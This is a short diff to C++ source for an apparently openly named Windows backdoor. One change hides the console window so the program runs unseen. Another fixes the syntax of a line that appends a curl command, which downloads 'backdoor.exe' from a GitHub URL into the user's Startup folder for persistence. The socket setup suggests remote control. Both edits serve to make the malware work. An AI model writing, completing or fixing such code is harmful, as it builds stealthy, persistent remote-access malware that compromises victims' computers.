@@ -40,7 +40,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR pCmdLine, int n
 
     stealth = FindWindowA("ConsoleWindowClass", NULL);
 
-    ShowWindow(stealth, 1);
+    ShowWindow(stealth, 0);
 
     sockaddr_in ServAdrr;
     // unsigned short ServPort = DEFAULT_PORT;
@@ -371,7 +371,7 @@ string CE_StartupExt(string buffer)
 
     if (default_commad == command)
     {
-        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/backdoor.exe -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.exe\""
+        command += " && curl -H \"Accept: application/vnd.github.v3+json\" https://raw.githubusercontent.com/s3q/blackdoor/main/backdoor.exe -o \"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.exe\"";
     }
 
     ebuf = command;
